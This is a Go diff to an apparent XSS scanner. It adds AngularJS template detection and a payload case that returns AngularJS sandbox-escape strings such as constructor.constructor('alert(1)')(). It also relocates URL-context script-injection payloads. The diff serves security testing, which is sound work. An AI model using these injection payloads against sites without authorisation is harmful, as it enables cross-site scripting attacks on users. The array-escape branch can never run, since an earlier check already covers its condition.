@@ -19,6 +19,13 @@ func DetectContext(body, probe string) models.ReflectionContext {
 	end := min(len(body), index+len(probe)+500)
 	context := body[start:end]
 
+	// Check for AngularJS first (before other checks)
+	if detectAngularJS(body) {
+		if isInAngularTemplate(context, probe) {
+			return models.ContextAngular
+		}
+	}
+
 	// Check contexts in order of specificity
 	if isInComment(context, probe) {
 		return models.ContextComment
@@ -148,20 +155,6 @@ func GetSuggestedPayload(context models.ReflectionContext, unfiltered []string) 
 		}
 		return "x:expression(alert(1))"
 
-	case models.ContextURL:
-		// Priority 1: Break out of tag (same as Attribute)
-		if hasGt && hasLt {
-			if hasDquote {
-				return "\"><script>alert(1)</script>"
-			}
-			if hasSquote {
-				return "'><script>alert(1)</script>"
-			}
-			return "><script>alert(1)</script>"
-		}
-		// Priority 2: Javascript protocol
-		return "javascript:alert(1)"
-
 	case models.ContextTemplateLiteral:
 		// Break out of template literal
 		if contains(unfiltered, "$") && contains(unfiltered, "{") && contains(unfiltered, "}") {
@@ -199,6 +192,40 @@ func GetSuggestedPayload(context models.ReflectionContext, unfiltered []string) 
 			return "--><script>alert(1)</script><!--"
 		}
 
+	case models.ContextAngular:
+		// AngularJS sandbox escape payloads
+		hasDot := contains(unfiltered, ".")
+		hasBracket := contains(unfiltered, "[") && contains(unfiltered, "]")
+
+		if hasParen && hasDot {
+			// Constructor-based escape (most reliable)
+			return "{{constructor.constructor('alert(1)')()}}"
+		}
+		if hasBracket && hasParen && hasDot {
+			// Array-based escape
+			return "{{[].pop.constructor('alert(1)')()}}"
+		}
+		if hasDot {
+			// $on-based escape (older Angular versions)
+			return "{{$on.constructor('alert(1)')()}}"
+		}
+		// Fallback - simple expression
+		return "{{alert(1)}}"
+
+	case models.ContextURL:
+		// Priority 1: Break out of tag (same as Attribute)
+		if hasGt && hasLt {
+			if hasDquote {
+				return "\"><script>alert(1)</script>"
+			}
+			if hasSquote {
+				return "'><script>alert(1)</script>"
+			}
+			return "><script>alert(1)</script>"
+		}
+		// Priority 2: Javascript protocol
+		return "javascript:alert(1)"
+
 	case models.ContextTagName:
 		if hasGt && hasSpace && hasEquals {
 			return " onload=alert(1)>"
@@ -222,6 +249,61 @@ func contains(slice []string, item string) bool {
 			return true
 		}
 	}
+	return false
+}
+
+// detectAngularJS checks if the response contains AngularJS indicators
+func detectAngularJS(body string) bool {
+	indicators := []string{
+		"ng-app",
+		"ng-controller",
+		"angular.js",
+		"angular.min.js",
+		"data-ng-app",
+		"x-ng-app",
+		"ng-bind",
+		"ng-model",
+	}
+
+	bodyLower := strings.ToLower(body)
+	for _, indicator := range indicators {
+		if strings.Contains(bodyLower, indicator) {
+			return true
+		}
+	}
+	return false
+}
+
+// isInAngularTemplate checks if probe is inside AngularJS template syntax
+func isInAngularTemplate(context, probe string) bool {
+	// Look for probe inside {{ }} expressions
+	beforeProbe := context[:strings.Index(context, probe)]
+	afterProbe := context[strings.Index(context, probe)+len(probe):]
+
+	// Count {{ and }} before probe
+	openBraces := strings.Count(beforeProbe, "{{")
+	closeBraces := strings.Count(beforeProbe, "}}")
+
+	// If more {{ than }}, we're inside a template
+	if openBraces > closeBraces {
+		// Check if there's a closing }} after probe
+		if strings.Contains(afterProbe, "}}") {
+			return true
+		}
+	}
+
+	// Also check if inside ng-* attributes
+	if strings.Contains(beforeProbe, "ng-") {
+		// Look for attribute value context
+		lastQuote := strings.LastIndexAny(beforeProbe, "\"'")
+		if lastQuote != -1 {
+			// Check if there's a closing quote after probe
+			if strings.ContainsAny(afterProbe, "\"'") {
+				return true
+			}
+		}
+	}
+
 	return false
 }
 
